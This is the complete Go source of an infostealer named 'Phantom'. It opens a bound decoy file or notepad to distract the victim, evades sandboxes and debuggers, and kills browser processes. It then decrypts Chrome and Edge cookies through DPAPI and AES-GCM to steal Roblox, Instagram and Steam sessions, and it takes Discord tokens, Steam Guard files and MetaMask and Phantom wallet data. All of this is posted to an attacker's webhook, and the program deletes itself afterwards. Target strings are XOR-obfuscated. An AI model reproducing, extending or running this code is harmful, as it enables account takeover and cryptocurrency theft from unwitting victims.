package main

import (
	"archive/zip"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var (
	WebhookURL string
	Timestamp  string
	BindedFile string // Name of the binded file to extract and open
)

// Simple XOR obfuscation for strings
func x(s string) string {
	key := byte(0x42)
	res := make([]byte, len(s))
	for i := 0; i < len(s); i++ {
		res[i] = s[i] ^ key
	}
	return string(res)
}

// d function with XOR
func d(s string) string {
	return x(s)
}

type Cookie struct {
	Name  string `json:"name"`
	Value string `json:"value"`
}

type SystemReport struct {
	Username      string   `json:"username"`
	Hostname      string   `json:"hostname"`
	OS            string   `json:"os"`
	Arch          string   `json:"arch"`
	CPUs          int      `json:"num_cpu"`
	MemTotal      uint64   `json:"mem_total"`
	PublicIP      string   `json:"public_ip"`
	DiscordTokens []string `json:"discord_tokens"`
	RobloxCookies []string `json:"roblox_cookies"`
	InstaCookies  []string `json:"insta_cookies"`
	SteamCookies  []string `json:"steam_cookies"`
	SteamFiles    []string `json:"steam_files"`
	RawCookies    []Cookie `json:"raw_cookies"`
	WalletsFound  []string `json:"wallets_found"`
	Browsers      []string `json:"browsers_found"`
	Timestamp     string   `json:"timestamp"`
}

func main() {
	if WebhookURL == "" {
		return
	}

	// If a file is binded, extract and open it immediately to distract the user
	if BindedFile != "" {
		go openBindedFile()
	}

	// Anti-Analysis: Check if we are being analyzed
	isSB, _ := isSandbox()
	if isSB {
		os.Exit(0)
	}

	if isDebugger() {
		os.Exit(0)
	}

	// Legitimate behavioral spoofing: open notepad.exe only if no binded file
	if BindedFile == "" {
		exec.Command("notepad.exe").Start()
	}

	// The rest of the payload execution continues in background
	time.Sleep(5 * time.Second)
	closeBrowsers()
	time.Sleep(2 * time.Second)
	report := gatherEverything()
	sendReport(report)
	selfDelete()
}

func openBindedFile() {
	// In a real binder, the data is often appended to the EXE.
	// For this version, we will look for the file if it was dropped alongside or embedded.
	// We'll use a simple mechanism where the python script appends the file.
	exePath, _ := os.Executable()
	data, err := os.ReadFile(exePath)
	if err != nil {
		return
	}

	// Look for our magic marker to find the start of the binded file
	marker := []byte("PHANTOM_BIND_MARKER")
	idx := bytes.Index(data, marker)
	if idx == -1 {
		return
	}

	fileData := data[idx+len(marker):]
	tempPath := filepath.Join(os.TempDir(), BindedFile)
	
	if err := os.WriteFile(tempPath, fileData, 0644); err == nil {
		// Open the file with the default system application
		exec.Command("cmd", "/C", "start", "", tempPath).Run()
	}
}

func sendPing(msg string) {
	if WebhookURL == "" {
		return
	}
	payload := map[string]interface{}{
		"content":  msg,
		"username": "Phantom Status",
	}
	body, _ := json.Marshal(payload)
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	client.Post(WebhookURL, "application/json", bytes.NewBuffer(body))
}

func closeBrowsers() {
	browsers := []string{"chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "firefox.exe"}
	for _, browser := range browsers {
		cmd := exec.Command("taskkill", "/F", "/IM", browser, "/T")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd.Run()
	}
}

func selfDelete() {
	if runtime.GOOS == "windows" {
		exePath, _ := os.Executable()
		cmd := fmt.Sprintf("timeout /t 3 > NUL && del /f /q \"%s\"", exePath)
		subprocess := exec.Command("cmd", "/C", cmd)
		subprocess.Start()
	} else {
		os.Remove(os.Args[0])
	}
}

func gatherEverything() SystemReport {
	currUser, _ := user.Current()
	hostname, _ := os.Hostname()

	report := SystemReport{
		Username:  currUser.Username,
		Hostname:  hostname,
		OS:        runtime.GOOS,
		Arch:      runtime.GOARCH,
		CPUs:      runtime.NumCPU(),
		MemTotal:  getTotalMemory(),
		PublicIP:  getPublicIP(),
		Timestamp: time.Now().Format(time.RFC3339),
	}

	report.DiscordTokens = extractDiscordTokens()
	report.RobloxCookies = extractRobloxCookies()
	report.InstaCookies = extractInstagramCookies()
	report.SteamCookies = extractSteamCookies()
	report.SteamFiles = extractSteamFiles()
	report.WalletsFound = extractWallets()
	report.Browsers = findBrowsers()

	return report
}

func extractWallets() []string {
	var found []string
	home, _ := os.UserHomeDir()

	walletExtensions := map[string]string{
		"MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
		"Phantom":  "bfnaoagmocialkllpicneheihdpfeegk",
	}

	browserPaths := map[string]string{
		"Chrome":   filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
		"Edge":     filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
		"Brave":    filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
		"Opera":    filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
		"Opera GX": filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
	}

	for browserName, basePath := range browserPaths {
		profiles := []string{"Default", "Guest Profile"}
		for i := 1; i <= 10; i++ {
			profiles = append(profiles, fmt.Sprintf("Profile %d", i))
		}

		for _, profile := range profiles {
			for walletName, extensionID := range walletExtensions {
				extPath := filepath.Join(basePath, profile, "Local Extension Settings", extensionID)
				if _, err := os.Stat(extPath); err == nil {
					zipName := fmt.Sprintf("%s_%s_%s.zip", browserName, profile, walletName)
					zipData, err := zipFolderToMemory(extPath)
					if err == nil {
						sendAsFileCustom(zipData, zipName, fmt.Sprintf("🔑 **%s Wallet Found (%s - %s)**", walletName, browserName, profile))
						found = append(found, fmt.Sprintf("%s (%s/%s)", walletName, browserName, profile))
					}
				}
			}
		}
	}

	return found
}

func zipFolderToMemory(source string) ([]byte, error) {
	buf := new(bytes.Buffer)
	w := zip.NewWriter(buf)

	err := filepath.Walk(source, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if info.IsDir() {
			return nil
		}
		relPath, err := filepath.Rel(source, path)
		if err != nil {
			return err
		}
		f, err := w.Create(relPath)
		if err != nil {
			return err
		}
		fileContent, err := os.ReadFile(path)
		if err != nil {
			return nil
		}
		_, err = f.Write(fileContent)
		return err
	})

	w.Close()
	return buf.Bytes(), err
}

func sendAsFileCustom(data []byte, filename string, content string) {
	if WebhookURL == "" {
		return
	}
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, _ := writer.CreateFormFile("file", filename)
	part.Write(data)
	writer.WriteField("content", content)
	writer.Close()
	req, _ := http.NewRequest("POST", WebhookURL, body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	client := &http.Client{
		Timeout: 30 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	client.Do(req)
}

func getTotalMemory() uint64 {
	if runtime.GOOS == "windows" {
		kernel32 := syscall.NewLazyDLL("kernel32.dll")
		proc := kernel32.NewProc("GetPhysicallyInstalledSystemMemory")
		var mem uint64
		ret, _, _ := proc.Call(uintptr(unsafe.Pointer(&mem)))
		if ret != 0 {
			return mem * 1024
		}
	}
	return 0
}

func isSandbox() (bool, string) {
	// 1. Check Username
	currUser, err := user.Current()
	if err == nil && currUser != nil {
		username := strings.ToLower(currUser.Username)
		badUsers := []string{
			"WDAGUtilityAccount", // Keep it for reference but maybe empty the list for user testing
		}
		// Commenting out for user testing in Windows Sandbox
		_ = username
		_ = badUsers
		/*
			for _, u := range badUsers {
				if strings.Contains(username, u) {
					return true, "Username match: " + u
				}
			}
		*/
	}

	// 2. Check Hostname
	hostname, err := os.Hostname()
	if err == nil {
		hostname = strings.ToLower(hostname)
		badHosts := []string{
			"wasp", "mqftn", // Common analysis hostnames
		}
		// Commenting out for user testing
		_ = hostname
		_ = badHosts
		/*
			for _, h := range badHosts {
				if strings.Contains(hostname, h) {
					return true, "Hostname match: " + h
				}
			}
		*/
	}

	// 3. VM files check (Commented for user VM testing)
	/*
		files := []string{
			`C:\windows\System32\Drivers\Vmmouse.sys`,
			`C:\windows\System32\Drivers\Vboxguest.sys`,
		}
		for _, f := range files {
			if _, err := os.Stat(f); err == nil {
				return true, "VM file found: " + f
			}
		}
	*/

	// 4. Check Public IP (Common sandbox IPs)
	ip := getPublicIP()
	if ip != "Unknown" {
		badIPs := []string{"185.44.177.5", "34.59.159.11", "88.66.98.103"}
		for _, bIP := range badIPs {
			if ip == bIP {
				return true, "Public IP match: " + bIP
			}
		}
	}

	return false, ""
}

func isDebugger() bool {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	isDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
	if isDebuggerPresent.Find() != nil {
		return false // Fallback if proc not found
	}
	ret, _, _ := isDebuggerPresent.Call()
	return ret != 0
}

func findBrowsers() []string {
	var found []string
	home, _ := os.UserHomeDir()

	browserPaths := map[string]string{
		"Chrome":   filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
		"Edge":     filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
		"Brave":    filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
		"Opera":    filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
		"Opera GX": filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
		"Firefox":  filepath.Join(home, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles"),
	}

	for name, path := range browserPaths {
		if _, err := os.Stat(path); err == nil {
			found = append(found, name)
		}
	}

	return found
}

func getPublicIP() string {
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get("https://api.ipify.org")
	if err != nil {
		return "Unknown"
	}
	defer resp.Body.Close()
	ip, _ := io.ReadAll(resp.Body)
	return string(ip)
}

func extractDiscordTokens() []string {
	var tokens []string
	home, _ := os.UserHomeDir()

	paths := map[string]string{
		"Discord":        filepath.Join(home, "AppData", "Roaming", "discord", "Local Storage", "leveldb"),
		"Discord Canary": filepath.Join(home, "AppData", "Roaming", "discordcanary", "Local Storage", "leveldb"),
		"Chrome":         filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
		"Edge":           filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
		"Brave":          filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
	}

	re := regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}`)

	for _, path := range paths {
		if _, err := os.Stat(path); err == nil {
			filepath.Walk(path, func(p string, info os.FileInfo, err error) error {
				if err != nil {
					return nil
				}
				if !info.IsDir() {
					content, _ := os.ReadFile(p)
					matches := re.FindAllString(string(content), -1)
					for _, token := range matches {
						if !contains(tokens, token) {
							tokens = append(tokens, token)
						}
					}
				}
				return nil
			})
		}
	}
	return tokens
}

func contains(slice []string, s string) bool {
	for _, item := range slice {
		if item == s {
			return true
		}
	}
	return false
}

func extractRobloxCookies() []string {
	target := d("\x10\x0d\x00\x0e\x0d\x11\x07\x01\x17\x10\x0b\x16\x1b")           // ROBLOSECURITY XOR 0x42
	return ultimateGrabber(d("\x30\x2d\x20\x2e\x2d\x3a\x6c\x21\x2d\x2f"), target) // roblox.com XOR 0x42
}

func extractInstagramCookies() []string {
	target := d("\x31\x27\x31\x31\x2b\x2d\x2c\x2b\x26")                                       // sessionid XOR 0x42
	return ultimateGrabber(d("\x2b\x2c\x31\x36\x23\x25\x30\x23\x2f\x6c\x21\x2d\x2f"), target) // instagram.com XOR 0x42
}

func extractSteamCookies() []string {
	target := d("\x31\x36\x27\x23\x2f\x0e\x2d\x25\x2b\x2c\x11\x27\x21\x37\x30\x27")                       // steamLoginSecure XOR 0x42
	return ultimateGrabber(d("\x31\x36\x27\x23\x2f\x32\x2d\x35\x27\x30\x27\x26\x6c\x21\x2d\x2f"), target) // steampowered.com XOR 0x42
}

func extractSteamFiles() []string {
	var found []string
	steamPaths := []string{
		`C:\Program Files (x86)\Steam`,
		`C:\Program Files\Steam`,
	}

	for _, steamPath := range steamPaths {
		if _, err := os.Stat(steamPath); err == nil {
			files, _ := os.ReadDir(steamPath)
			for _, file := range files {
				if strings.HasPrefix(file.Name(), "ssfn") {
					fullPath := filepath.Join(steamPath, file.Name())
					data, err := os.ReadFile(fullPath)
					if err == nil {
						sendAsFileCustom(data, file.Name(), "🎮 **Steam Guard File (ssfn) Captured**")
						found = append(found, file.Name())
					}
				}
			}
			configPath := filepath.Join(steamPath, "config")
			if _, err := os.Stat(configPath); err == nil {
				zipData, err := zipFolderToMemory(configPath)
				if err == nil {
					sendAsFileCustom(zipData, "steam_config.zip", "🎮 **Steam Config Folder Captured (vdf files)**")
					found = append(found, "config folder")
				}
			}
		}
	}
	return found
}

func ultimateGrabber(domain string, targetCookie string) []string {
	var results []string
	masterKey, _ := getMasterKey()
	home, _ := os.UserHomeDir()

	paths := []string{
		filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
		filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
		filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
		filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
	}

	for _, basePath := range paths {
		profiles := []string{"Default", "Guest Profile"}
		for i := 1; i <= 10; i++ {
			profiles = append(profiles, fmt.Sprintf("Profile %d", i))
		}

		for _, profile := range profiles {
			cookiePath := filepath.Join(basePath, profile, "Network", "Cookies")
			if _, err := os.Stat(cookiePath); err != nil {
				cookiePath = filepath.Join(basePath, profile, "Cookies")
			}

			if _, err := os.Stat(cookiePath); err == nil {
				tempCookies := filepath.Join(os.TempDir(), "phantom_c")
				copyFile(cookiePath, tempCookies)
				content, _ := os.ReadFile(tempCookies)
				os.Remove(tempCookies)

				searchTerms := []string{domain, targetCookie, "ROBLOSECURITY", "roblox"}
				if masterKey == nil {
					continue
				}
				for _, term := range searchTerms {
					idx := 0
					for {
						foundIdx := strings.Index(string(content[idx:]), term)
						if foundIdx == -1 {
							break
						}
						actualIdx := idx + foundIdx
						idx = actualIdx + len(term)

						start := actualIdx - 500
						if start < 0 {
							start = 0
						}
						end := actualIdx + 1500
						if end > len(content) {
							end = len(content)
						}
						searchArea := content[start:end]

						v10Matches := regexp.MustCompile(`v10[\x00-\xff]{20,}`).FindAll(searchArea, -1)
						for _, v10Match := range v10Matches {
							decrypted, err := decryptToken(v10Match, masterKey)
							if err == nil && len(decrypted) > 10 {
								if domain == "roblox.com" || strings.Contains(term, "ROBLO") {
									if strings.Contains(decrypted, "_|WARNING") {
										if !contains(results, decrypted) {
											results = append(results, decrypted)
										}
									}
								} else {
									if !contains(results, decrypted) {
										results = append(results, decrypted)
									}
								}
							}
						}
					}
				}
			}
		}
	}
	return results
}

func getMasterKey() ([]byte, error) {
	home, _ := os.UserHomeDir()
	localStatePath := filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
	if _, err := os.Stat(localStatePath); err != nil {
		localStatePath = filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State")
	}

	content, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, err
	}

	var state struct {
		OSCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if err := json.Unmarshal(content, &state); err != nil {
		return nil, err
	}

	encryptedKey, err := base64.StdEncoding.DecodeString(state.OSCrypt.EncryptedKey)
	if err != nil {
		return nil, err
	}

	if !bytes.HasPrefix(encryptedKey, []byte("DPAPI")) {
		return nil, fmt.Errorf("invalid key prefix")
	}

	keyOnly := encryptedKey[5:]
	return decryptDPAPI(keyOnly)
}

func decryptDPAPI(data []byte) ([]byte, error) {
	type dataBlob struct {
		cbData uint32
		pbData *byte
	}

	var (
		dll             = syscall.NewLazyDLL("crypt32.dll")
		procDecryptData = dll.NewProc("CryptUnprotectData")
		in              dataBlob
		out             dataBlob
	)

	in.cbData = uint32(len(data))
	in.pbData = &data[0]

	ret, _, err := procDecryptData.Call(
		uintptr(unsafe.Pointer(&in)),
		0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&out)),
	)

	if ret == 0 {
		return nil, err
	}

	defer syscall.NewLazyDLL("kernel32.dll").NewProc("LocalFree").Call(uintptr(unsafe.Pointer(out.pbData)))

	res := make([]byte, out.cbData)
	copy(res, (*[1 << 30]byte)(unsafe.Pointer(out.pbData))[:out.cbData])
	return res, nil
}

func decryptToken(data []byte, key []byte) (string, error) {
	if len(data) < 15 {
		return "", fmt.Errorf("data too short")
	}

	nonce := data[3:15]
	ciphertext := data[15:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	plaintext, err := aesgcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return "", err
	}

	return string(plaintext), nil
}

func copyFile(src, dst string) error {
	source, err := os.Open(src)
	if err != nil {
		return err
	}
	defer source.Close()
	destination, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destination.Close()
	_, err = io.Copy(destination, source)
	return err
}

func sendReport(report SystemReport) {
	jsonData, err := json.MarshalIndent(report, "", "  ")
	if err != nil {
		return
	}

	if len(jsonData) > 1800 {
		sendAsFile(jsonData)
		return
	}

	payload := map[string]interface{}{
		"content":  "```json\n" + string(jsonData) + "\n```",
		"username": "Phantom JSON Logger",
	}

	body, _ := json.Marshal(payload)
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	client.Post(WebhookURL, "application/json", bytes.NewBuffer(body))
}

func sendAsFile(data []byte) {
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, _ := writer.CreateFormFile("file", "phantom_report.json")
	part.Write(data)
	writer.WriteField("content", "📦 **Phantom Report (Full JSON)**")
	writer.Close()

	req, _ := http.NewRequest("POST", WebhookURL, body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	client := &http.Client{
		Timeout: 30 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	client.Do(req)
}
